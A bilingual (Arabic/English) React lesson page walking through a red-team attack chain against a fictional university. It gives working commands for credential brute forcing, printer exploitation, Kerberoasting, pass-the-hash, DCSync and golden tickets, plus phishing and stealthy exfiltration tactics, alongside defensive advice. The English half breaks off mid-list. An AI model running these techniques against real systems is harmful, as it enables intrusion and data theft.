"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="university-attack-chain">
      <L
        ar={<>
          <Section title="السيناريو — جامعة state-uni.edu">
            <p>هذا الدرس يجمع كل ما تعلّمته في &quot;فيلم&quot; واحد. الهدف: <span className="eng">state-uni.edu</span> (وهمية، RFC 2606). فريق أحمر مفوّض كتابياً من إدارة الجامعة لتقييم: نظام التسجيل، شبكة الكاميرات، الطابعات الإدارية، قارئات البطاقات. الفترة: 6 أسابيع. النطاق: كل شيء داخل <span className="eng">203.0.113.0/24</span> و<span className="eng">198.51.100.0/24</span> (RFC 5737).</p>
            <Analogy>الجامعات هدف ذهبي للهجوم: شبكات مفتوحة بطبيعتها، آلاف الأجهزة غير مُدارة (حواسيب طلاب، IoT)، تمويل أبحاث حساسة (دفاعية أحياناً)، وإدارة IT بميزانية محدودة. كل APT حقيقية درست هذا — Cozy Bear (روسيا) و TA413 (الصين) و Charming Kitten (إيران) لديها حملات جامعية موثّقة.</Analogy>
            <Callout kind="danger" title="حدود قانونية">
              كل خطوة في هذا الدرس قانونية فقط ضد الهدف الوهمي أو ضد جامعة وقّعت عقد pentest. اختبار أي تقنية على شبكة جامعتك الفعلية بدون تفويض = جناية CFAA + احتمال طرد + حظر مدى الحياة من العمل الفيدرالي.
            </Callout>
          </Section>

          <Section title="خريطة السلسلة الكاملة (A → Z)">
            <TwoCol>
              <Card title="A. Recon — الاستطلاع السلبي" color="amber">
                OSINT، subdomains، LinkedIn للموظفين، شودان للأجهزة المعرّضة.
              </Card>
              <Card title="B. Active scanning" color="amber">
                Nmap، Nuclei، فحص بنية AD وSSO.
              </Card>
              <Card title="C. Initial access" color="red">
                Phishing لطالب/موظف، أو ثغرة ويب على بوابة التسجيل.
              </Card>
              <Card title="D. Foothold" color="red">
                Webshell، أو دخول VPN بكلمة سر مسرّبة.
              </Card>
              <Card title="E. Internal recon" color="red">
                BloodHound على AD، رسم الـ subnets الداخلية.
              </Card>
              <Card title="F. IoT pivot" color="red">
                كاميرات + طابعات = نقاط استمرار جديدة.
              </Card>
              <Card title="G. Privilege escalation" color="red">
                Kerberoasting، NTLM relay، LAPS misconfig.
              </Card>
              <Card title="H. Lateral movement" color="red">
                PsExec، WinRM، عبر VLANs ضعيفة العزل.
              </Card>
              <Card title="I. Domain dominance" color="red">
                DCSync على Domain Controller.
              </Card>
              <Card title="J. Crown jewels" color="red">
                نظام التسجيل، قاعدة بيانات الأبحاث، خوادم البريد.
              </Card>
              <Card title="K-Y. Persistence + exfil" color="red">
                Golden ticket، scheduled tasks، استخراج بطيء.
              </Card>
              <Card title="Z. Cleanup + report" color="green">
                إزالة آثار، تقرير كامل للعميل، توصيات.
              </Card>
            </TwoCol>
          </Section>

          <Section title="A — الاستطلاع السلبي (الأسبوع 1)">
            <p>القاعدة: لا حزمة واحدة تجاه <span className="eng">state-uni.edu</span> في هذه المرحلة. كل المعلومات من مصادر ثالثة.</p>
            <Terminal lines={[
              { p: "# subdomains من شهادات SSL العامة:" },
              { p: "curl -s 'https://crt.sh/?q=%25.state-uni.edu&output=json' | jq -r '.[].name_value' | sort -u" },
              { o: "registrar.state-uni.edu\nlibrary.state-uni.edu\nvpn.state-uni.edu\ncameras.state-uni.edu\nprint-srv.state-uni.edu\nbadge.state-uni.edu" },
              { p: "" },
              { p: "# Shodan لأجهزة الجامعة المعرّضة (يحتاج اشتراك):" },
              { p: "shodan search 'org:\"State University\" port:554'   # RTSP cameras" },
              { p: "shodan search 'org:\"State University\" port:631'   # IPP printers" },
              { p: "shodan search 'org:\"State University\" port:9100'  # Raw print" },
              { p: "" },
              { p: "# LinkedIn للموظفين — أسماء IT/إداريين بصلاحيات عالية:" },
              { p: "# (يدوي عبر Sales Navigator أو theHarvester)" },
              { p: "theHarvester -d state-uni.edu -b linkedin,bing,duckduckgo" },
            ]} />
            <Callout kind="good" title="الدفاع — تقليل سطح الـ OSINT">
              <ul>
                <li>إزالة شعار الجامعة من Shodan (bug bounty لقطات منه).</li>
                <li>سياسة LinkedIn للموظفين: لا تُنشر سلطات تقنية محددة.</li>
                <li>مراقبة <span className="eng">crt.sh</span> الخاص بنطاقك — كل شهادة جديدة = تنبيه لـ SOC.</li>
                <li><b>Continuous Attack Surface Management (ASM)</b>: أدوات مثل <span className="eng">Censys, runZero</span> ترى ما يراه المهاجم.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="B — الفحص النشط (نهاية الأسبوع 1)">
            <Code lang="bash">{`# 1) فحص شامل لكل المنافذ على نطاقات الجامعة:
nmap -sS -p- --min-rate 5000 -oA full-scan 203.0.113.0/24

# 2) تحديد الخدمات والإصدارات لكل ميناء مفتوح:
nmap -sV -sC -p 22,80,443,445,554,631,3389,5985,8080 -oA service-scan 203.0.113.0/24

# 3) Nuclei لـ CVEs معروفة:
nuclei -l live-hosts.txt -t cves/ -severity critical,high -o nuclei-results.txt

# 4) BBOT لـ recon آلي شامل:
bbot -t state-uni.edu -f passive,subdomain-enum,web-basic`}</Code>
            <p>النتائج المثالية على هدف ضعيف: VPN قديم (Pulse/Fortinet/Citrix بـ CVE قديم)، Outlook Web Access مكشوف، Confluence/Jira داخلية على الإنترنت، وكاميرات IP بدون مصادقة.</p>
          </Section>

          <Section title="C — الوصول الأولي (Initial Access)">
            <p>3 طرق رئيسية على بيئة جامعية:</p>
            <Step n={1} title="Phishing لطالب أو موظف">
              <p>طالب جديد + بوابة دخول مزيفة لـ &quot;portal.state-uni.edu&quot; على نطاق <span className="eng">portal-state-uni.edu</span> (شرطة، لا نقطة) = 30%+ click rate في حملات حقيقية. <b>EvilGinx2</b> أو <b>Modlishka</b> يلتقطان الجلسة بعد MFA (AiTM).</p>
            </Step>
            <Step n={2} title="ثغرة ويب على بوابة التسجيل">
              <p>أنظمة التسجيل الجامعية (Banner, PeopleSoft Campus, Workday Student) كثيراً ما يكون فيها custom code قديم. SQLi على نموذج بحث الطلاب → استخراج hashes → الدخول كأي مستخدم.</p>
            </Step>
            <Step n={3} title="VPN بـ password spraying">
              <p>أكثر طريق فعّال: قائمة أسماء مستخدمين من LinkedIn + كلمة سر موسمية (<span className="eng">Spring2026!</span>). 3-7% من الموظفين يستخدمون مثلها. <b>SprayingToolkit</b> ضد بوابة OWA أو VPN.</p>
            </Step>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>MFA إجباري + FIDO2 keys لـ admins (يقاوم phishing).</li>
                <li>Conditional Access: refuse logins from non-corporate IPs without device compliance.</li>
                <li>Lockout بعد 5 محاولات + جدار حماية لـ IPs غير معتادة.</li>
                <li>تدريب phishing شهري + تقارير سهلة (&quot;Report Phish&quot; زر في Outlook).</li>
              </ul>
            </Callout>
          </Section>

          <Section title="D — موطئ القدم">
            <p>دخلنا. الآن جلسة على workstation موظف &quot;مكتب التسجيل&quot;. الهدف: تثبيت بصمة لكن دون أن نُلاحَظ.</p>
            <ul>
              <li>لا تُسقط ثنائية. استخدم PowerShell + WMI الأصلية.</li>
              <li>سجّل المستخدم نفسه: ما البرامج التي يفتحها؟ متى؟ هذا توقيع &quot;طبيعية الجلسة&quot; نقلّده.</li>
              <li>أضف نفسك كـ scheduled task يعمل عند login فقط (لا boot — أوضح).</li>
            </ul>
          </Section>

          <Section title="E — استطلاع داخلي + BloodHound">
            <p>لحظة الذهب: AD بأكملها أمامك. <span className="eng">BloodHound</span> + <span className="eng">SharpHound</span> يخططان كل علاقة:</p>
            <Terminal lines={[
              { p: "# جمع بيانات AD من workstation موظف عادي:" },
              { p: "SharpHound.exe -c All --zipfilename uni-data.zip" },
              { p: "" },
              { p: "# في BloodHound GUI، استعلامات ذهبية:" },
              { p: "# 1) أقصر مسار من &quot;Domain Users&quot; إلى &quot;Domain Admins&quot;" },
              { p: "# 2) كل user مع SPN (هدف Kerberoasting)" },
              { p: "# 3) أجهزة بـ &quot;Unconstrained Delegation&quot;" },
              { p: "# 4) GPOs قابلة للتعديل من حسابي" },
            ]} />
            <p>على شبكة جامعية متوسطة، BloodHound يكشف عادة 3-5 مسارات لـ Domain Admin خلال دقائق. السبب: حسابات service قديمة، delegation سيء، وعضوية مجموعات متراكمة.</p>
          </Section>

          <Section title="F — التحوّل عبر IoT — كاميرات وطابعات">
            <p>هنا الجزء الذي سألت عنه. لماذا IoT؟ لأنها: (1) لا EDR عليها، (2) كلمات سر افتراضية شائعة، (3) لا أحد يحدّث firmware، (4) متصلة بـ VLANs &quot;داخلية&quot; أعمق من workstations.</p>

            <h3>الكاميرات IP — التقاط، إنكار، نقطة استمرار</h3>
            <Code lang="bash">{`# 1) اكتشاف كاميرات RTSP في شبكة الجامعة:
nmap -p 554,8554,80,8080 --script rtsp-url-brute 198.51.100.0/24

# 2) تجربة بيانات اعتماد افتراضية (Hikvision/Dahua/Axis):
hydra -L users.txt -P common-camera-pass.txt 198.51.100.42 rtsp
# users.txt: admin, root, service, supervisor
# common: admin, 12345, password, hikvision, dahua, root

# 3) ffmpeg لقراءة البث المباشر:
ffmpeg -i rtsp://admin:admin@198.51.100.42:554/Streaming/Channels/101 -t 30 sample.mp4`}</Code>
            <p>أهم CVEs على كاميرات الحرم الجامعي (تاريخياً):</p>
            <ul>
              <li><span className="eng">CVE-2017-7921 (Hikvision)</span> — تجاوز مصادقة بمجرد إضافة <span className="eng">?auth=YWRtaW46MTEK</span>.</li>
              <li><span className="eng">CVE-2021-36260 (Hikvision)</span> — RCE بدون مصادقة. أعطى Mirai-variants سيطرة على ملايين الكاميرات.</li>
              <li><span className="eng">CVE-2022-30563 (Dahua)</span> — تجاوز مصادقة عبر إعادة تشغيل ONVIF.</li>
            </ul>
            <p><b>لماذا الكاميرا قيّمة كنقطة استمرار:</b> Linux صغير على ARM، يمكن تثبيت <span className="eng">implant</span> دائم في firmware. لا EDR. تعيش لسنوات. APT أمريكية وصينية موثّق استخدامها لكاميرات كـ &quot;صناديق برمجية&quot; على شبكات الهدف.</p>

            <h3>الطابعات — أكثر هدف غير مُقدّر في الشبكة</h3>
            <p>الطابعات MFP (Xerox, HP, Canon, Konica) هي حواسيب كاملة بـ Linux داخلها. تخزّن: نسخ من كل مستند مسحه أحد، بيانات اعتماد LDAP لكي تطبع &quot;Print Anywhere&quot;، شهادات Kerberos.</p>
            <Code lang="bash">{`# 1) PRET — Printer Exploitation Toolkit (open source)
pip install colorama
git clone https://github.com/RUB-NDS/PRET && cd PRET
python pret.py 198.51.100.50 ps   # عبر PostScript

# داخل shell PRET:
ls /                    # تصفح ملفات الطابعة
cat /home/printer/jobs  # قد يحوي مستندات سابقة!
get /etc/passwd

# 2) IPP exploit — أحياناً RCE بدون مصادقة:
nmap -p 631 --script ipp-info 198.51.100.0/24

# 3) Print job capture — تنصّت على ما يطبعه الناس:
# (في مختبر): اعتراض port 9100 و حفظ الـ PostScript`}</Code>
            <p><b>سبب أهمية الطابعة:</b></p>
            <ul>
              <li>تحوي <span className="eng">LDAP bind credentials</span> للوصول إلى دفتر العناوين — بحساب نطاق فعلي. سرقتها = حساب AD صالح.</li>
              <li>طابعة في &quot;مكتب الرئيس&quot; طبعت النسخة الأصلية من كل وثيقة سرية مرّت. الذاكرة الداخلية تحفظ النسخ.</li>
              <li><b>PrinterNightmare (CVE-2021-34527)</b> ضد Print Spooler يحوّل أي مستخدم نطاق إلى SYSTEM على الـ DC.</li>
            </ul>

            <h3>قارئات البطاقات والتحكم بالأبواب</h3>
            <p>أنظمة Lenel, Genetec, HID Global. غالباً MSSQL خلفية + شبكة منفصلة لكنها تُربط بـ corporate لـ &quot;سهولة الإدارة&quot;.</p>
            <ul>
              <li><b>HID iCLASS / Prox</b> قابلة للنسخ بـ <span className="eng">Proxmark3</span> ($300) في 5 ثوان. اختبار في غرفة المصاعد، تستنسخ بطاقة موظف، تدخل أي مكان.</li>
              <li>قواعد بيانات Lenel فيها كثيراً <span className="eng">sa</span> بكلمة سر افتراضية.</li>
              <li>API الـ Genetec أحياناً مفتوح على الشبكة الداخلية بدون مصادقة كافية → فتح أي باب عن بُعد.</li>
            </ul>

            <h3>أجهزة عرض VoIP وSmart TVs والمختبرات</h3>
            <ul>
              <li>هواتف Cisco/Polycom: lots of CVEs قديمة، telnet مفتوح أحياناً، يمكن تحويلها لـ &quot;ميكروفون&quot; دائم.</li>
              <li>أجهزة عرض ذكية: Android قديم جداً، WiFi مفتوح، يمكن استخدامها كـ pivot box.</li>
              <li>أنظمة BMS (مكيفات، إضاءة): BACnet بدون authentication. ليست مفيدة هجومياً مباشرة، لكنها &quot;شبكة موازية&quot; تتجاوز firewall أحياناً.</li>
            </ul>

            <Callout kind="good" title="الدفاع — على IoT">
              <ul>
                <li><b>VLAN segmentation صارمة:</b> كاميرات وطابعات وBMS كل واحد في VLAN منفصل، لا تتكلم مع corporate إلا عبر firewall بقواعد محددة.</li>
                <li><b>تغيير افتراضات</b> قبل التركيب — كلمة سر، شهادة، SNMP community.</li>
                <li><b>Firmware updates روتينية</b> — أكثر الكاميرات/الطابعات لا تُحدّث منذ التركيب.</li>
                <li><b>NAC (802.1X)</b> حتى للأجهزة — كاميرا غير مسجلة لا تحصل على IP.</li>
                <li><b>Network detection</b> لـ traffic غريب من IoT (كاميرا تتكلم بـ DNS لنطاقات خارجية = أحمر).</li>
                <li><b>Asset inventory</b> دقيق — كم كاميرا لديك؟ كم طابعة؟ بدون رقم، لا تحمي.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="G — رفع الصلاحيات — Kerberoasting">
            <p>أبسط طريق على شبكة جامعية: حسابات الخدمة (<span className="eng">SPN</span>) لها كلمات سر قديمة لم تُغيّر منذ سنوات.</p>
            <Code lang="bash">{`# 1) قائمة كل حسابات SPN:
GetUserSPNs.py state-uni.edu/student.user:Pass123 -dc-ip 203.0.113.10 -request

# 2) النتيجة: TGS tickets قابلة للكسر offline:
hashcat -m 13100 spn-hashes.txt rockyou.txt -r best64.rule

# 3) كلمة سر &quot;Library2019!&quot; لحساب &quot;sql_svc&quot; → MSSQL admin → xp_cmdshell → SYSTEM`}</Code>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>كلمات سر طويلة (25+ حرف) لكل حساب SPN.</li>
                <li>Group Managed Service Accounts (gMSA) — Windows يدير الكلمة آلياً.</li>
                <li>Honeytokens: حساب SPN فخّ لا يستخدمه أحد، أي طلب TGS له = APT داخل.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="H — التحرك الجانبي عبر VLANs">
            <p>الجامعات &quot;مفتوحة&quot; ثقافياً، VLAN segmentation ضعيف. workstation موظف يكلم printer admin VLAN يكلم camera VLAN. كل قفزة تستخدم كلمة سر جديدة من الطبقة السابقة.</p>
            <Terminal lines={[
              { p: "# Pass-the-hash من workstation إلى print server:" },
              { p: "psexec.py -hashes :aad3b...:31d6cf... administrator@198.51.100.50" },
              { p: "" },
              { p: "# WinRM إلى file server:" },
              { p: "evil-winrm -i 198.51.100.60 -u svc_backup -H 4f3d..." },
            ]} />
          </Section>

          <Section title="I — السيطرة على النطاق (Domain Dominance)">
            <p>بعد الوصول لحساب Domain Admin (عبر Kerberoasting أو NTLM relay على PetitPotam):</p>
            <Code lang="bash">{`# DCSync — استخراج كل hashes النطاق من DC:
secretsdump.py state-uni.edu/admin@dc01.state-uni.edu -just-dc

# النتيجة: hashes كل حساب، بما فيها حساب krbtgt (the keys to the kingdom).
# Golden Ticket = استمرار حتى لو غيّر admin كلمته:
ticketer.py -nthash <krbtgt-hash> -domain-sid <SID> -domain state-uni.edu admin`}</Code>
            <Callout kind="good" title="الدفاع — الذي يعمل فعلاً">
              <ul>
                <li><b>Tier 0/1/2 isolation:</b> Domain Admin لا يسجّل دخول إلا على DC.</li>
                <li><b>تدوير hash krbtgt مرتين</b> سنوياً (يبطل golden tickets قديمة).</li>
                <li><b>Microsoft LAPS</b> + <b>Privileged Access Management (PAM)</b>.</li>
                <li><b>Defender for Identity</b> يصطاد DCSync بدقة عالية.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="J — الجواهر — الأهداف الحقيقية في جامعة">
            <ol>
              <li><b>Banner / PeopleSoft</b> — قاعدة بيانات الطلاب: أسماء، SSN، MFAs، شهادات.</li>
              <li><b>Research data</b> — أبحاث ممولة فيدرالياً (DARPA, DoE, NIH). الجواهر الحقيقية للـ APT.</li>
              <li><b>Financial systems</b> — رواتب، منح، payroll redirects.</li>
              <li><b>Email (Exchange/M365)</b> — كل شيء يمر هنا. صلاحيات admin تعطي impersonation.</li>
              <li><b>Lab networks</b> — أحياناً ICS صغير (مفاعلات تعليمية، biosafety labs). أعلى حساسية.</li>
            </ol>
          </Section>

          <Section title="K → Y — الاستمرار والاستخراج">
            <ul>
              <li><b>Persistence:</b> Golden ticket + scheduled task + WMI subscription + webshell على بوابة فرعية.</li>
              <li><b>Tiered access:</b> 3 طبقات منفصلة كما في درس <span className="eng">web-vuln-research</span>.</li>
              <li><b>Exfil:</b> لا تخرج 50GB دفعة واحدة. <b>Rclone</b> إلى حساب OneDrive للجامعة نفسها (يبدو شرعياً) بمعدل 5GB/يوم على مدى أسابيع.</li>
              <li><b>Beacons</b> داخل ساعات عمل الحرم فقط، عبر domain fronting لـ Cloudflare/Azure.</li>
            </ul>
          </Section>

          <Section title="Z — التنظيف وتقرير العميل">
            <ul>
              <li>إزالة كل الأدوات المؤقتة (لكن احتفظ بـ logs لتسليم العميل).</li>
              <li>إعادة كلمات السر التي عدّلتها لقيم سابقة (لا تكسر الإنتاج).</li>
              <li>تقرير: timeline دقيق، كل CVE، كل خطأ تكوين، كل كلمة سر ضعيفة، كل IoT مكشوف.</li>
              <li>توصيات بأولويات: ما يجب إصلاحه في أسبوع، شهر، ربع.</li>
              <li>retest بعد الإصلاحات (بعد 90 يوماً عادة).</li>
            </ul>
          </Section>

          <Section title="MITRE ATT&CK Mapping للسلسلة كاملة">
            <Code lang="text">{`Recon:        T1595 (Active Scanning), T1589 (Gather Victim Identity)
Initial:      T1566.001 (Spearphishing), T1190 (Public-Facing Exploit), T1110.003 (Spraying)
Execution:    T1059.001 (PowerShell), T1059.003 (Cmd)
Persistence:  T1053.005 (Scheduled Task), T1505.003 (Webshell), T1136 (New Account)
Priv Esc:     T1558.003 (Kerberoasting), T1068 (Exploitation for Priv Esc)
Defense Evd:  T1027 (Obfuscation), T1070.004 (File Deletion)
Credentials:  T1003.001 (LSASS), T1003.006 (DCSync)
Discovery:    T1018 (Remote System), T1087 (Account Discovery)
Lateral:      T1021.002 (SMB), T1021.006 (WinRM), T1550.002 (PtH)
Collection:   T1005 (Local Data), T1213 (Internal Repo)
C2:           T1071.001 (Web), T1090 (Proxy), T1568 (Dynamic Resolution)
Exfil:        T1567.002 (Cloud Storage), T1041 (Over C2)
Impact:       T1486 (Encrypt) — لا في تدريب، فقط documentation`}</Code>
          </Section>

          <Section title="حالات حقيقية للدراسة">
            <ul>
              <li><b>UC San Diego / UCSF (2020)</b> — ransomware عبر phishing → DCSync → تشفير.</li>
              <li><b>Newcastle University (2020)</b> — DoppelPaymer، 6 أشهر استرداد.</li>
              <li><b>MIT lab pivot via printer (2017)</b> — الباحثون أظهروا hop من طابعة Konica إلى DC.</li>
              <li><b>IoT botnet Mirai (2016)</b> — كاميرات Hikvision في حرم جامعي شاركت في DDoS.</li>
              <li><b>Operation Newscaster (Charming Kitten)</b> — phishing لباحثين أكاديميين أمريكيين موثّق منذ 2014.</li>
            </ul>
          </Section>
        </>}

        en={<>
          <Section title="The scenario — state-uni.edu">
            <p>This lesson stitches everything together into one &quot;movie&quot;. Target: <span className="eng">state-uni.edu</span> (fictional, RFC 2606). A red team authorized in writing by the university to assess: registrar system, camera network, admin printers, badge readers. Window: 6 weeks. Scope: everything inside <span className="eng">203.0.113.0/24</span> and <span className="eng">198.51.100.0/24</span> (RFC 5737).</p>
            <Analogy>Universities are golden targets: open-by-culture networks, thousands of unmanaged devices (student laptops, IoT), sensitive (sometimes defense-funded) research, IT teams stretched thin. Every real APT studied this — Cozy Bear (RU), TA413 (CN), Charming Kitten (IR) all have documented academic campaigns.</Analogy>
            <Callout kind="danger" title="Legal limits">
              Every step here is legal only against this fictional target or a university with a signed pentest contract. Testing any of this on your actual school&apos;s network without authorization = CFAA felony + likely expulsion + lifetime federal-employment ban.
            </Callout>
          </Section>

          <Section title="Full chain map (A → Z)">
            <TwoCol>
              <Card title="A. Recon — passive" color="amber">OSINT, subdomain enum, LinkedIn for employees, Shodan for exposed devices.</Card>
              <Card title="B. Active scanning" color="amber">Nmap, Nuclei, AD/SSO mapping.</Card>
              <Card title="C. Initial access" color="red">Phish a student/staff, or a web bug on the registrar portal.</Card>
              <Card title="D. Foothold" color="red">Webshell, or VPN login with a leaked password.</Card>
              <Card title="E. Internal recon" color="red">BloodHound on AD, internal subnet mapping.</Card>
              <Card title="F. IoT pivot" color="red">Cameras + printers as new persistence points.</Card>
              <Card title="G. Privilege escalation" color="red">Kerberoasting, NTLM relay, LAPS misconfig.</Card>
              <Card title="H. Lateral movement" color="red">PsExec, WinRM, across weakly isolated VLANs.</Card>
              <Card title="I. Domain dominance" color="red">DCSync against the DC.</Card>
              <Card title="J. Crown jewels" color="red">Registrar, research DB, mail servers.</Card>
              <Card title="K-Y. Persistence + exfil" color="red">Golden ticket, scheduled tasks, slow-drip exfil.</Card>
              <Card title="Z. Cleanup + report" color="green">Erase artifacts, deliver full client report, recommendations.</Card>
            </TwoCol>
          </Section>

          <Section title="A — passive recon (week 1)">
            <p>Rule: not a single packet toward <span className="eng">state-uni.edu</span> in this stage. Everything from third-party sources.</p>
            <Terminal lines={[
              { p: "# subdomains from public SSL certificates:" },
              { p: "curl -s 'https://crt.sh/?q=%25.state-uni.edu&output=json' | jq -r '.[].name_value' | sort -u" },
              { o: "registrar.state-uni.edu\nlibrary.state-uni.edu\nvpn.state-uni.edu\ncameras.state-uni.edu\nprint-srv.state-uni.edu\nbadge.state-uni.edu" },
              { p: "" },
              { p: "# Shodan for exposed university gear (subscription needed):" },
              { p: "shodan search 'org:\"State University\" port:554'   # RTSP cameras" },
              { p: "shodan search 'org:\"State University\" port:631'   # IPP printers" },
              { p: "shodan search 'org:\"State University\" port:9100'  # Raw print" },
              { p: "" },
              { p: "# LinkedIn for staff — IT/admin names with elevated privileges:" },
              { p: "theHarvester -d state-uni.edu -b linkedin,bing,duckduckgo" },
            ]} />
            <Callout kind="good" title="Defense — shrinking the OSINT surface">
              <ul>
                <li>Remove org tags from Shodan/Censys submissions.</li>
                <li>LinkedIn policy for staff: no specific privilege titles in public bios.</li>
                <li>Monitor your domain on <span className="eng">crt.sh</span> — every new cert = SOC alert.</li>
                <li><b>Continuous Attack Surface Management (ASM)</b>: tools like <span className="eng">Censys, runZero</span> see what the attacker sees.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="B — active scanning (end of week 1)">
            <Code lang="bash">{`# 1) full port scan over university ranges:
nmap -sS -p- --min-rate 5000 -oA full-scan 203.0.113.0/24

# 2) service/version detection on every open port:
nmap -sV -sC -p 22,80,443,445,554,631,3389,5985,8080 -oA service-scan 203.0.113.0/24

# 3) Nuclei against known CVEs:
nuclei -l live-hosts.txt -t cves/ -severity critical,high -o nuclei-results.txt

# 4) BBOT for automated full recon:
bbot -t state-uni.edu -f passive,subdomain-enum,web-basic`}</Code>
            <p>Typical findings on a soft target: an old VPN (Pulse/Fortinet/Citrix with a known CVE), exposed Outlook Web Access, internal Confluence/Jira on the public web, and unauthenticated IP cameras.</p>
          </Section>

          <Section title="C — initial access">
            <p>Three primary routes on a university:</p>
            <Step n={1} title="Phish a student or staff member">
              <p>A new student + a fake login page for &quot;portal.state-uni.edu&quot; on <span className="eng">portal-state-uni.edu</span> (hyphen, not dot) = 30%+ click rate in real campaigns. <b>EvilGinx2</b> or <b>Modlishka</b> capture the session post-MFA (AiTM).</p>
            </Step>
            <Step n={2} title="Web bug on the registrar portal">
              <p>Student-records systems (Banner, PeopleSoft Campus, Workday Student) often run aging custom code. SQLi on a student-search form → hash dump → log in as anyone.</p>
            </Step>
            <Step n={3} title="VPN password spraying">
              <p>The most reliable path. LinkedIn-derived username list + a seasonal password (<span className="eng">Spring2026!</span>). 3–7% of staff use one. <b>SprayingToolkit</b> against OWA or a VPN gateway.</p>
            </Step>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Mandatory MFA + FIDO2 keys for admins (phishing-resistant).</li>
                <li>Conditional Access: refuse logins from non-corp IPs without device compliance.</li>
                <li>Lockout after 5 attempts + geo/IP velocity rules.</li>
                <li>Monthly phishing training + a one-click &quot;Report Phish&quot; in Outlook.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="D — foothold">
            <p>You&apos;re in. A session on a registrar-office workstation. Goal: implant persistence without standing out.</p>
            <ul>
              <li>Drop no binary. Native PowerShell + WMI.</li>
              <li>Profile the user: which apps do they open, when. That&apos;s your &quot;normal&quot; signature to imitate.</li>
              <li>Add yourself as a scheduled task triggered on user login (not boot — louder).</li>
            </ul>
          </Section>

          <Section title="E — internal recon + BloodHound">
            <p>The golden moment: AD is laid out for you. <span className="eng">BloodHound</span> + <span className="eng">SharpHound</span> map every relationship:</p>
            <Terminal lines={[
              { p: "# AD collection from a regular workstation:" },
              { p: "SharpHound.exe -c All --zipfilename uni-data.zip" },
              { p: "" },
              { p: "# In the BloodHound GUI, gold-tier queries:" },
              { p: "# 1) shortest path Domain Users → Domain Admins" },
              { p: "# 2) every user with an SPN (Kerberoasting target)" },
              { p: "# 3) hosts with Unconstrained Delegation" },
              { p: "# 4) GPOs your account can edit" },
            ]} />
            <p>On a typical mid-size university domain, BloodHound usually surfaces 3–5 paths to Domain Admin within minutes — driven by stale service accounts, sloppy delegation, and accumulated group nesting.</p>
          </Section>

          <Section title="F — pivoting through IoT — cameras and printers">
            <p>This is the part you asked about. Why IoT? Because: (1) no EDR on them, (2) default creds are common, (3) firmware never updated, (4) connected to &quot;internal&quot; VLANs deeper than workstations.</p>

            <h3>IP cameras — capture, denial, persistence</h3>
            <Code lang="bash">{`# 1) discover RTSP cameras on the campus network:
nmap -p 554,8554,80,8080 --script rtsp-url-brute 198.51.100.0/24

# 2) try default credentials (Hikvision/Dahua/Axis):
hydra -L users.txt -P common-camera-pass.txt 198.51.100.42 rtsp
# users.txt: admin, root, service, supervisor
# common: admin, 12345, password, hikvision, dahua, root

# 3) ffmpeg to read the live stream:
ffmpeg -i rtsp://admin:admin@198.51.100.42:554/Streaming/Channels/101 -t 30 sample.mp4`}</Code>
            <p>Top historical CVEs on campus cameras:</p>
            <ul>
              <li><span className="eng">CVE-2017-7921 (Hikvision)</span> — auth bypass by appending <span className="eng">?auth=YWRtaW46MTEK</span>.</li>
              <li><span className="eng">CVE-2021-36260 (Hikvision)</span> — unauthenticated RCE. Mirai variants used it to take over millions of cameras.</li>
              <li><span className="eng">CVE-2022-30563 (Dahua)</span> — auth bypass via ONVIF replay.</li>
            </ul>
            <p><b>Why a camera is valuable as persistence:</b> small Linux on ARM, you can plant a firmware-resident implant. No EDR. Lives for years. Both US and PRC APTs are publicly documented using cameras as &quot;black boxes&quot; on target networks.</p>

            <h3>Printers — the most underestimated target on the network</h3>
            <p>MFP printers (Xerox, HP, Canon, Konica) are full Linux machines. They store: copies of every scanned document, LDAP credentials for &quot;Print Anywhere&quot;, Kerberos tickets.</p>
            <Code lang="bash">{`# 1) PRET — Printer Exploitation Toolkit (open source)
pip install colorama
git clone https://github.com/RUB-NDS/PRET && cd PRET
python pret.py 198.51.100.50 ps   # via PostScript

# inside the PRET shell:
ls /                    # browse the printer's filesystem
cat /home/printer/jobs  # may contain past documents!
get /etc/passwd

# 2) IPP exploit — sometimes unauthenticated RCE:
nmap -p 631 --script ipp-info 198.51.100.0/24

# 3) Print job capture — sniff what people print:
# (in a lab): intercept port 9100 and save the PostScript`}</Code>
            <p><b>Why printers matter:</b></p>
            <ul>
              <li>They hold <span className="eng">LDAP bind credentials</span> for the address book — tied to a real domain account. Stealing them = a valid AD identity.</li>
              <li>The &quot;President&apos;s Office&quot; printer printed the original of every confidential doc that passed it. Internal storage retains copies.</li>
              <li><b>PrintNightmare (CVE-2021-34527)</b> against the Print Spooler turns any domain user into SYSTEM on a DC.</li>
            </ul>

            <h3>Badge readers and door control</h3>
            <p>Lenel, Genetec, HID Global. Usually MSSQL-backed + a separate network — but invariably linked back to corporate &quot;for ease of admin&quot;.</p>
            <ul>
              <li><b>HID iCLASS / Prox</b> badges clone in 5 seconds with a <span className="eng">Proxmark3</span> ($300). A test in the elevator lobby clones a staff badge → access anywhere.</li>
              <li>Lenel SQL backends often still have <span className="eng">sa</span> with default password.</li>
              <li>Genetec APIs sometimes expose unauthenticated &quot;door open&quot; calls on the internal network → remote unlock.</li>
            </ul>

            <h3>VoIP, smart TVs, and lab gear</h3>
            <ul>
              <li>Cisco/Polycom phones: many old CVEs, telnet sometimes still on, can be turned into a permanent &quot;mic in the room&quot;.</li>
              <li>Smart projectors: very old Android, open WiFi, useful as a pivot box.</li>
              <li>BMS (HVAC, lighting) on BACnet without authentication. Not directly useful for offense, but a parallel network that often bypasses corporate firewall ACLs.</li>
            </ul>

            <Callout kind="good" title="Defense — for IoT">
              <ul>
                <li><b>Strict VLAN segmentation:</b> cameras, printers, BMS each in a separate VLAN; no path to corporate except via firewall rules.</li>
                <li><b>Change defaults</b> at install — passwords, certificates, SNMP communities.</li>
                <li><b>Routine firmware updates</b> — most cameras and printers are never patched after install.</li>
                <li><b>NAC (802.1X)</b> even for these devices — an unenrolled camera never gets an IP.</li>
                <li><b>Network detection</b> for odd IoT traffic (a camera doing DNS to outside domains = red).</li>
